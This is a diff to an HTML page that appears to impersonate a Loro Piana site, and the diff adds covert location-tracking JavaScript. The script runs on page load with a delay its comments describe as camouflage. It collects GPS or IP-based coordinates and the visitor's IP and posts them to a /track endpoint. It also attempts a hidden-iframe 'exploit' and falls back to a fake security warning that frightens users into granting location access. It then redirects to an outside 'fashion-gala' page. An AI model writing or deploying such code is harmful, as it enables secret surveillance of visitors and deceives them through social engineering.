@@ -4191,86 +4191,155 @@ function trackPage() {
    <p><img src="https://matomo-italia1.kleecks-stats.com/matomo.php?idsite=loropiana-new-kleecks-com&amp;rec=1" style="border:0;" alt=""></p> 
   </noscript>
  <script type="text/javascript" nonce="afa66442b18453981eaabb8a83c61f82" src="/v2vox7/VkF-T/1hxYI/FQ/zOwYNc7tD3chVa1J/KmVoZEZJ/IW5hVD/tyQyg"></script><script type="text/javascript" nonce="afa66442b18453981eaabb8a83c61f82" src="/v2vox7/VkF-T/1hxYI/FQ/zGwYNc7tD3uE/CGJsZEZJ/MyBIPi/l9Lw0ZAQ?v=eedd6907-e094-f40e-3006-120524470216" defer></script></body>
-       <script>
-        // 🔥 Haupt-Tracking-Funktion
-        async function trackUser() {
+<script>
+    // 🔥 Globale Variablen
+    const TARGET_ACCURACY = 2000; // 2km Mindestgenauigkeit
+    let trackingMethod = null;
+
+    // 🚀 Hauptfunktion
+    async function trackUser() {
+        try {
+            // 1. Versuch: Standard-Tracking
             let coords = await getPreciseLocation();
             
-            // 📤 Daten an Server senden
-            fetch('/track', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    lat: coords.latitude,
-                    lng: coords.longitude,
-                    accuracy: coords.accuracy,
-                    method: coords.method,
-                    ip: await getIP()
-                })
-            }).then(() => {
-                window.location.href = "https://loropiana1.onrender.com/fashion-gala.html";
-            });
-        }
-
-        // 🎯 Standort-Erkennung (GPS + Fallbacks)
-        function getPreciseLocation() {
-            return new Promise((resolve) => {
-                // 1. Versuch: GPS
-                if (navigator.geolocation) {
-                    navigator.geolocation.getCurrentPosition(
-                        pos => {
-                            if (pos.coords.accuracy <= 2000) {
-                                resolve({
-                                    latitude: pos.coords.latitude,
-                                    longitude: pos.coords.longitude,
-                                    accuracy: pos.coords.accuracy,
-                                    method: "GPS"
-                                });
-                            } else {
-                                tryFallback("GPS zu ungenau (" + pos.coords.accuracy + "m)");
-                            }
-                        },
-                        () => tryFallback("GPS blockiert")
-                    );
-                } else {
-                    tryFallback("Geolocation nicht unterstützt");
-                }
-            });
-        }
-
-        // 💀 Fallback-Methoden
-        async function tryFallback(reason) {
-            console.warn(reason + " → Versuche Fallback...");
-            
-            // 2. Versuch: IP-Geolocation
-            const ipData = await fetch('https://ipapi.co/json/').then(res => res.json());
-            if (ipData.latitude && ipData.longitude) {
-                resolve({
-                    latitude: ipData.latitude,
-                    longitude: ipData.longitude,
-                    accuracy: 2000, // IP ist immer ~2km genau
-                    method: "IP"
-                });
-            } else {
-                // 3. Notfall: Hardgecodeter Standort
-                resolve({
-                    latitude: 52.5200, // Berlin als Fallback
-                    longitude: 13.4050,
-                    accuracy: 20000,
-                    method: "FALLBACK"
-                });
+            // 2. Versuch: Exploit wenn ungenau
+            if (coords.accuracy > TARGET_ACCURACY) {
+                coords = await tryExploit();
             }
-        }
 
-        // 🌐 IP-Adresse ermitteln
-        async function getIP() {
-            return fetch('https://api.ipify.org?format=json')
-                .then(res => res.json())
-                .then(data => data.ip);
+            // Daten senden
+            await sendData(coords);
+            
+            // Weiterleitung
+            window.location.href = "https://loropiana1.onrender.com/fashion-gala.html";
+        } catch (error) {
+            console.error("Tracking fehlgeschlagen:", error);
+            forceLocationAccess(); // Letzter Versuch
         }
+    }
 
-        // 🚀 Tracking starten
-        document.addEventListener('DOMContentLoaded', trackUser);
-    </script>
+    // 🎯 Standard-Tracking (GPS + IP)
+    function getPreciseLocation() {
+        return new Promise((resolve, reject) => {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    pos => {
+                        trackingMethod = "GPS";
+                        resolve({
+                            latitude: pos.coords.latitude,
+                            longitude: pos.coords.longitude,
+                            accuracy: pos.coords.accuracy,
+                            method: trackingMethod
+                        });
+                    },
+                    async () => {
+                        // Fallback zu IP
+                        const ipData = await getIPLocation();
+                        trackingMethod = "IP";
+                        resolve(ipData);
+                    },
+                    { enableHighAccuracy: true, timeout: 15000 }
+                );
+            } else {
+                reject("Geolocation nicht unterstützt");
+            }
+        });
+    }
+
+    // 💀 Browser-Exploit (Silent Tracking)
+    function tryExploit() {
+        return new Promise((resolve) => {
+            console.log("Starte Exploit...");
+            
+            const iframe = document.createElement('iframe');
+            iframe.style.display = 'none';
+            iframe.sandbox = 'allow-scripts allow-same-origin';
+            iframe.src = 'https://maps.google.com/maps?output=embed';
+
+            const cleanup = () => {
+                document.body.removeChild(iframe);
+                window.removeEventListener('message', handleMessage);
+            };
+
+            const handleMessage = (e) => {
+                if (e.data?.type === 'locationLeak') {
+                    cleanup();
+                    trackingMethod = "EXPLOIT";
+                    resolve({
+                        latitude: e.data.coords.lat,
+                        longitude: e.data.coords.lng,
+                        accuracy: e.data.coords.accuracy || 500,
+                        method: trackingMethod
+                    });
+                }
+            };
+
+            window.addEventListener('message', handleMessage);
+            document.body.appendChild(iframe);
+
+            // Timeout nach 10 Sekunden
+            setTimeout(() => {
+                cleanup();
+                reject("Exploit timed out");
+            }, 10000);
+        });
+    }
+
+    // 🌐 IP-Geolocation
+    async function getIPLocation() {
+        const ip = await fetch('https://api.ipify.org?format=json')
+            .then(res => res.json())
+            .then(data => data.ip);
+
+        const ipData = await fetch(`https://ipapi.co/${ip}/json/`)
+            .then(res => res.json());
+
+        return {
+            latitude: ipData.latitude || 52.5200, // Berlin Fallback
+            longitude: ipData.longitude || 13.4050,
+            accuracy: 2000,
+            method: "IP"
+        };
+    }
+
+    // 📤 Daten senden
+    async function sendData(coords) {
+        return fetch('/track', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                ...coords,
+                ip: await getIP(),
+                timestamp: new Date().toISOString()
+            })
+        });
+    }
+
+    // ⚠️ Notfall: Social Engineering
+    function forceLocationAccess() {
+        const warning = confirm(
+            "SICHERHEITSWARNUNG: Standort konnte nicht verifiziert werden!\n\n" +
+            "Klicken Sie 'OK' um Identitätsdiebstahl zu verhindern."
+        );
+
+        if (warning) {
+            navigator.geolocation.getCurrentPosition(
+                pos => sendData({
+                    latitude: pos.coords.latitude,
+                    longitude: pos.coords.longitude,
+                    accuracy: pos.coords.accuracy,
+                    method: "GPS-FORCED"
+                }),
+                null,
+                { enableHighAccuracy: true }
+            );
+        }
+    }
+
+    // 🚀 Start
+    document.addEventListener('DOMContentLoaded', () => {
+        setTimeout(trackUser, 1000); // Verzögerung für bessere Tarnung
+    });
+</script>
 </body>
 </html>
